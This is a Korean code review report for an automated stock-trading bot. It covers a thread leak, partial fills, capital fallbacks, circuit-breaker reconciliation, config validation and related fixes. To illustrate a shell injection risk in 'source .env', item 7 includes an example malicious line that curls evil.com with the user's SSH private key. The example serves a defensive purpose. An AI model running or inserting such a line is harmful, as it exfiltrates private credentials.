# 014_casper 코드 점검 보고서

**점검일:** 2026-04-11
**점검 범위:** src/ 전체 (bot.py, api/, core/, data/, telegram/, utils/), config/, run_casper.sh
**점검 항목:** 보안 취약점, 잠재적 버그, 거래 안전성, 데이터 무결성

---

## CRITICAL - 즉시 대응 필요

### 1. ThreadPoolExecutor 스레드 누수

**위치:** `src/data/market_data.py:42-44`

```python
def _yf_with_timeout(func, *args, **kwargs):
    with ThreadPoolExecutor(max_workers=1) as pool:
        future = pool.submit(func, *args, **kwargs)
        return future.result(timeout=_YF_TIMEOUT)
```

**문제:** yfinance 호출이 `_YF_TIMEOUT`(30초) 이후 timeout되면, future는 취소되지만 내부 스레드는 계속 실행된다. `ThreadPoolExecutor.__exit__`는 `shutdown(wait=True)`를 호출하므로, timeout이 발동해도 해당 스레드가 끝날 때까지 블로킹된다. 매 호출마다 새 executor를 생성하고, yfinance가 장기간 응답하지 않으면 스레드가 누적되거나 교착 상태에 빠질 수 있다.

**수정 방안:** executor를 모듈 레벨 싱글턴으로 유지하고, timeout 발생 시 future를 cancel 처리:

```python
_yf_executor = ThreadPoolExecutor(max_workers=2, thread_name_prefix="yf")

def _yf_with_timeout(func, *args, **kwargs):
    future = _yf_executor.submit(func, *args, **kwargs)
    try:
        return future.result(timeout=_YF_TIMEOUT)
    except FuturesTimeout:
        future.cancel()
        raise
```

---

### 2. 부분 체결(Partial Fill) 미처리

**위치:** `src/bot.py:636-692` (`_close_and_record`)

**문제:** `sell_market()`이 성공 응답을 반환해도 부분 체결일 수 있다. KIS API는 주문 접수 성공만 확인하며, 전량 체결을 보장하지 않는다. 현재 코드는 매도 주문이 접수되면 즉시 전체 포지션을 청산한 것으로 기록한다. 잔여 수량이 브로커에 남아있으면 오버나잇 리스크가 발생한다.

**수정 방안:** 매도 후 `get_us_holdings()`로 잔여 수량 확인, 잔량이 있으면 재매도 시도:

```python
# _close_and_record 내부, SELL ORDER OK 이후
if self.kis_client:
    holdings = self.kis_client.get_us_holdings()
    remaining = next((h for h in (holdings or []) if h["symbol"] == self.position.symbol), None)
    if remaining and remaining["qty"] > 0:
        logger.warning(f"PARTIAL FILL: {remaining['qty']} shares remaining — retrying sell")
        self.kis_order.sell_market(self.position.symbol, remaining["qty"])
```

---

### 3. 하드코딩 폴백 자본금 $1500

**위치:** `src/bot.py:502-505`

```python
if self.capital <= 0:
    self._sync_capital()
    if self.capital <= 0:
        self.capital = 1500.0
        logger.warning(f"Using default capital: ${self.capital:.2f}")
```

**문제:** KIS API가 일시적으로 다운되면 자본금이 0으로 잡히고, $1500 기본값으로 포지션 사이즈가 결정된다. 실제 계좌에 $10,000가 있어도 $1500 기준으로만 매수하거나, 반대로 계좌에 $500만 있어도 $1500 기준으로 과도한 주문이 나갈 수 있다.

**수정 방안:** 자본 동기화 실패 시 거래를 하지 않도록 변경:

```python
if self.capital <= 0:
    self._transition(BotState.DONE_TODAY, "Capital sync failed — skipping today")
    return
```

---

## HIGH - 거래 안전성 이슈

### 4. 시장 주문 슬리피지 버퍼 부족

**위치:** `src/api/kis_order.py:49,74`

```python
limit_price = round(price * 1.005, 2)  # Buy: +0.5%
limit_price = round(price * 0.995, 2)  # Sell: -0.5%
```

**문제:** 0.5% 슬리피지 버퍼는 TQQQ/SQQQ의 변동성 대비 부족할 수 있다. 특히 ORB 브레이크아웃 직후(변동성 최대 구간)에서 매수하므로, 급등 시 지정가가 체결되지 않아 주문이 실패할 수 있다. 반대로 급락 시 매도 주문이 미체결되면 손실이 확대된다.

**수정 방안:** `strategy_params.json`에서 configurable하게 변경:

```json
"order": {
    "buy_slippage_pct": 0.01,
    "sell_slippage_pct": 0.01
}
```

---

### 5. ~~서킷브레이커 연속 손실 카운터가 주간 리셋~~ (의도된 설계)

**위치:** `src/core/risk.py:109-118`

**재검토 결론:** 현재 동작은 합리적인 설계임.

연속 손실 카운터는 "전략-시장 부조화"를 감지하는 역할이다. 주말을 넘기면 시장이 닫혔다 다시 열리므로 새로운 시장 국면이 시작되며, 월요일 아침에 VIX/QQQ 필터를 새로 평가한다. 금요일에 전략이 안 맞았던 환경이 월요일에는 바뀌어 있을 수 있으므로, 연속 손실 카운터를 주간 리셋하는 것은 기회를 불필요하게 차단하지 않기 위한 의도적 설계다. 주간 손실률(자본 보호)과 연속 손실(시장 부조화 감지)의 리셋 주기가 동일한 것이 이 전략에서는 적절하다.

---

### 6. exit 가격 추정치로 circuit breaker가 갱신되는 문제

**위치:** `src/bot.py:625-629`, `src/bot.py:676-679`

```python
# ① 15초 폴링 기반 exit 가격 추정
exit_price = (self.position.stop_loss if "stop" in exit_reason
              else self.position.take_profit if exit_reason == "take_profit"
              else current)

# ② _close_and_record 내부 실행 순서
close_position(position, price, ...)        # 추정 PnL 계산
self.circuit_breaker.record_trade(...)      # 추정 PnL로 CB 갱신
self._reconcile_with_broker()               # 실제 체결가로 trade 파일 보정
```

**문제:** 15초 폴링이므로 SL/TP 이론가와 실제 감지 시점 가격은 항상 차이가 있다. `stop_loss`로 기록하든 `current`로 기록하든 둘 다 추정치다. 진짜 문제는 `_reconcile_with_broker()`가 trade 파일은 보정하지만, **circuit breaker에 이미 반영된 추정 PnL은 보정하지 않는다**는 점이다. 이로 인해 CB가 실제보다 낙관적/비관적인 PnL로 판단할 수 있다.

**수정 방안:** reconcile에서 실제 체결가를 확인한 후 CB를 재갱신:

```python
def _reconcile_with_broker(self):
    # ... 기존 broker 조회 로직 ...
    if broker_gross_pnl is not None:
        # CB에 반영된 추정 PnL을 실제 PnL로 교정
        old_pnl = self.position.net_pnl
        actual_pnl = broker_gross_pnl - self.position.commission
        if abs(actual_pnl - old_pnl) > 0.01:
            self.circuit_breaker.correct_last_trade(old_pnl, actual_pnl, self.capital)
```

---

## MEDIUM - 보안/안정성 이슈

### 7. run_casper.sh의 .env source 주입 가능성

**위치:** `run_casper.sh:33`

```bash
source .env
```

**문제:** `source`는 셸 명령을 직접 실행한다. `.env` 파일에 악성 코드가 삽입되면 임의 명령이 실행된다:

```bash
# 악성 .env 예시
KIS_APP_KEY=abc; curl http://evil.com/steal?key=$(cat ~/.ssh/id_rsa)
```

**수정 방안:** 안전한 환경변수 로딩 패턴 사용:

```bash
load_env() {
    if [ -f ".env" ]; then
        set -a
        while IFS='=' read -r key value; do
            [[ "$key" =~ ^#.*$ || -z "$key" ]] && continue
            export "$key=$value"
        done < .env
        set +a
    fi
}
```

---

### 8. OAuth 토큰 평문 저장

**위치:** `src/api/kis_auth.py:99-111`

```python
json.dump({"token": self._token, "expires": self._token_expires, ...}, f)
os.chmod(TOKEN_FILE, 0o600)
```

**문제:** 토큰이 `config/token.json`에 평문으로 저장된다. 파일 권한은 `0o600`으로 설정되어 양호하나, 머신이 침해되면 즉시 토큰이 노출된다.

**경감 요소:**
- `.gitignore`에서 `token.json` 제외 확인됨
- `0o600` 파일 권한 설정됨
- 토큰 유효기간 23시간 (자동 만료)

**권장:** 현재 수준에서 추가 조치 필요성은 낮음. OS-level 키체인 연동은 과도한 복잡성.

---

### 9. 설정 파일 스키마 검증 없음

**위치:** `src/utils/config.py:46-50`

**문제:** `strategy_params.json`에 대한 스키마 검증이 없다:
- `rr_ratio: -1` → 음수 R:R로 역방향 TP 설정
- `max_shares: 999999` → 과도한 포지션
- `vix_low: 50, vix_high: 10` → 범위 역전으로 모든 날 skip
- 필수 키 누락 시 `KeyError` 런타임 에러

잘못된 설정이 런타임 에러가 아닌 잘못된 거래를 유발할 수 있다.

**수정 방안:** 시작 시 기본 검증 추가:

```python
def _validate_params(params: dict) -> None:
    assert params["entry"]["rr_ratio"] > 0, "rr_ratio must be positive"
    assert params["risk"]["max_shares"] > 0, "max_shares must be positive"
    assert params["filters"]["vix_low"] < params["filters"]["vix_high"], "vix range inverted"
    # ... 등
```

---

### 10. ~~로그에 민감 정보 노출~~ (의도된 운영)

**위치:** `src/api/kis_order.py:135-138`, `src/api/kis_auth.py:57`

**재검토 결론:** 주문 번호, 수량, 가격 등의 거래 로그는 사후 데이터 종합 검토를 위해 의도적으로 기록하는 것이며, 삭제 대상이 아니다. `.gitignore`에서 `logs/` 디렉토리가 제외되어 있어 유출 위험은 낮다.

**잔여 개선점:** 로그 로테이션 정책 부재는 별도 항목(#13)에서 다룸.

---

### 11. 이중 실행 방지(PID 파일) 경쟁 조건

**위치:** `run_casper.sh:73-85`

**문제:** PID 파일 기반 중복 실행 방지는 경쟁 조건에 취약하다:
- 두 인스턴스가 거의 동시에 PID 체크를 통과할 수 있음
- 봇이 crash 후 PID 파일이 남아있고, 같은 PID를 가진 다른 프로세스가 실행 중이면 오탐

**수정 방안:** `flock` 기반 파일 잠금 추가:

```bash
exec 200>"$SCRIPT_DIR/.casper.lock"
flock -n 200 || { echo "Already running"; exit 1; }
```

---

## LOW - 개선 권장

### 12. 예외 처리 중복

**위치:** `src/data/market_data.py:117`

```python
except (FuturesTimeout, Exception) as e:
```

`FuturesTimeout`은 `Exception`의 하위 클래스이므로 중복이다. `except Exception as e:`로 충분.

---

### 13. 로그 파일 로테이션 미구현

**위치:** `src/utils/logger.py`

일자별 로그 파일을 생성하지만 삭제/압축 로직이 없다. 장기 운영 시 디스크 공간 소모.

**TODO:** 별도 정리 작업으로 분리. 로그 보존 기간, 압축 정책을 결정한 후 일괄 적용.

---

### 14. 공휴일 파일 누락 시 무경고

**위치:** `src/utils/time_utils.py:29-30`

```python
except (FileNotFoundError, json.JSONDecodeError):
    pass  # No holidays file — weekday-only fallback
```

공휴일 파일이 없거나 파싱 실패해도 경고 없이 계속 진행한다. 공휴일에 매매 시도 → 주문 실패 → `DONE_TODAY`로 전환되겠지만, 불필요한 API 호출이 발생한다.

**수정 방안:** `logger.warning()` 추가

---

### 15. 공휴일 데이터 갱신 필요

**위치:** `config/us_holidays.json`

현재 2026-2027년만 포함. 매년 수동 갱신이 필요하다.

**수정 방안:** 연초 1회 실행하는 경량 갱신 스크립트 추가 (`scripts/update_holidays.py`):

```python
"""연초에 한 번 실행하여 us_holidays.json을 갱신한다.
Usage: python scripts/update_holidays.py 2028
"""
import json, sys
import exchange_calendars as xcals
import pandas as pd

year = int(sys.argv[1]) if len(sys.argv) > 1 else pd.Timestamp.now().year + 1
cal = xcals.get_calendar("XNYS")
all_weekdays = pd.bdate_range(f"{year}-01-01", f"{year}-12-31")
sessions = cal.sessions_in_range(f"{year}-01-01", f"{year}-12-31")
holidays = sorted(set(all_weekdays.strftime("%Y-%m-%d")) - set(sessions.strftime("%Y-%m-%d")))

path = "config/us_holidays.json"
with open(path) as f:
    data = json.load(f)
data[str(year)] = holidays
with open(path, "w") as f:
    json.dump(data, f, indent=4, ensure_ascii=False)
print(f"{year}: {len(holidays)} holidays added")
```

`exchange_calendars`는 갱신 스크립트 전용 의존성 (봇 런타임에는 불필요).

---

### 16. ~~Telegram notifier 미연결~~ (의도된 비활성화)

**위치:** `src/bot.py:84`

**재검토 결론:** 의도적으로 Telegram 알림을 비활성화한 상태. 수정 불필요.

---

## 요약

| 등급 | 건수 | 핵심 항목 | 상태 |
|------|------|-----------|------|
| **CRITICAL** | 3 | 스레드 누수, 부분체결 미처리, 하드코딩 자본금 | **수정 완료** (2026-04-11) |
| **HIGH** | 2 | 슬리피지 부족, CB reconcile 보정 | **수정 완료** (2026-04-11) |
| **MEDIUM** | 4 | .env 주입, 토큰 평문, 스키마 미검증, PID 경쟁조건 | .env/스키마/PID **수정 완료**, 토큰 평문은 현행 유지 |
| **LOW** | 4 | 예외 중복, 로그 로테이션, 공휴일 경고, 공휴일 갱신 | 예외/경고/갱신 **수정 완료**, 로그 로테이션은 별도 작업 |
| **의도된 설계/운영** | 3 | CB 연속손실 주간 리셋, 거래 로그 상세 기록, 텔레그램 미연결 | 수정 불필요 |

### 수정 내역 (2026-04-11)

| # | 항목 | 수정 파일 | 테스트 |
|---|------|-----------|--------|
| 1 | ThreadPoolExecutor 싱글턴 전환 | `src/data/market_data.py` | 2 추가 |
| 2 | 부분 체결 감지 + 재매도 | `src/bot.py` | 2 추가 |
| 3 | 자본금 폴백 제거 → DONE_TODAY | `src/bot.py` | 2 추가 |
| 4 | 슬리피지 설정화 (0.5% → configurable) | `src/api/kis_order.py`, `config/strategy_params.json`, `src/bot.py` | 3 추가 |
| 5 | CB reconcile 보정 | `src/core/risk.py`, `src/bot.py` | 4 추가 |
| 6 | 설정 파일 스키마 검증 | `src/utils/config.py` | 4 추가 |
| 7 | .env 안전 로딩 | `run_casper.sh` | - |
| 8 | flock 중복 실행 방지 | `run_casper.sh` | - |
| 9 | 예외 처리 중복 제거 | `src/data/market_data.py` | 2 추가 |
| 10 | 공휴일 파일 누락 경고 | `src/utils/time_utils.py` | 2 추가 |
| 11 | 공휴일 갱신 스크립트 | `scripts/update_holidays.py` (신규) | - |

**전체 테스트:** 257 passed (기존 236 + 신규 21)

### 양호한 부분

- `.gitignore` 설정 적절 (`.env`, `token.json`, `data/`, `logs/` 제외)
- 파일 쓰기 시 `tmp + os.replace` 원자적 쓰기 패턴 사용
- 토큰 파일 `0o600` 권한 설정
- POST 주문 시 재시도 비활성화 (`retry=False`) — 중복 주문 방지
- 크래시 복구 시 브로커 보유량 검증 (`_restore_position`)
- KIS → yfinance 이중 데이터 소스 폴백 구조
- 상태머신 기반 명확한 생명주기 관리
- 서머타임(DST) 자동 대응: `pytz.timezone("US/Eastern")`이 EST/EDT를 자동 전환하며, 거래 시간(8:00~16:00)이 DST 전환 경계(2:00 AM)와 겹치지 않아 안전
